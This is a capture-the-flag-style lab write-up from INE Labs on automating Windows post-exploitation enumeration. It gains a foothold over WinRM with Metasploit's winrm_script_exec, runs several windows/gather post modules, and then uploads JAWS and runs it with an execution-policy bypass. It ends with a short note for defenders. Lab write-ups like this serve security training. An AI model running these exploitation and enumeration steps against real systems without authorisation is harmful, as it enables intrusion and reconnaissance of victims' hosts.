---
title: "Automating Windows Local Enumeration"
description: "Automating Windows post-exploitation enumeration: a WinRM foothold, running the windows/gather/* Metasploit post modules (privileges, logged-on users, VM, apps, patches, shares), then running the JAWS PowerShell script for a full automated report."
date: 2025-12-05
platform: "INE Labs"
difficulty: "Medium"
tags: ["Windows", "Post-Exploitation", "Enumeration", "WinRM", "JAWS", "Metasploit", "Automation"]
cover: "./photo6.png"
---

# Automating Windows Local Enumeration

**Classification:** Host & Network Penetration Testing / Post-Exploitation<br>
**Target:** Windows host (WinRM on 5985)

## 1. Executive Summary

Rather than enumerate by hand, we automate it. After a **WinRM** foothold, we run the
`windows/gather/*` Metasploit post modules (privileges, logged-on users, VM check, installed
apps, domain computers, patches, shares), then upload and run **JAWS** (Just Another Windows
Script) for a full automated enumeration report.

## 2. Foothold (WinRM)

```bash
db_nmap -sV <target>
db_nmap -sV -p5985 <target>
use exploit/windows/winrm/winrm_script_exec
set FORCE_VBS true
exploit
```

![Nmap scans](./photo1.png)

![Port 5985 (WinRM)](./photo2.png)

![winrm_script_exec configured (1)](./photo3.png)

![Meterpreter session (2)](./photo4.png)

![Drives connected](./photo5.png)

## 3. Metasploit Post Modules

```bash
run post/windows/gather/win_privs
```

![win_privs](./photo6.png)

```bash
run post/windows/gather/enum_logged_on_users
```

![enum_logged_on_users](./photo7.png)

```bash
run post/windows/gather/checkvm
```

![checkvm](./photo8.png)

```bash
run post/windows/gather/enum_applications
```

![enum_applications](./photo9.png)

```bash
run post/windows/gather/enum_computers
```

![enum_computers](./photo10.png)

```bash
run post/windows/gather/enum_patches
```

![enum_patches](./photo11.png)

```bash
run post/windows/gather/enum_shares
```

![enum_shares](./photo12.png)

## 4. JAWS Script

![JAWS — what it enumerates](./photo13.png)

Uploading and running the PowerShell script, outputting to a file.

```cmd
mkdir C:\Temp
```

![Copying the script (1)](./photo14.png)

![Creating C:\Temp (2)](./photo15.png)

![Uploading JAWS (3)](./photo16.png)

```powershell
powershell.exe -ExecutionPolicy Bypass -File jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

![Running JAWS (1)](./photo17.png)

![JAWS output (2)](./photo18.png)

Downloading the report.

![Downloading the report (1)](./photo19.png)

![Hundreds of lines of enumeration (2)](./photo20.png)

## 5. Notes

Automated enumeration (JAWS, WinPEAS, PrivescCheck) quickly surfaces privesc paths — but it is
noisy; defenders should **monitor for mass enumeration** and script execution from unusual
processes.
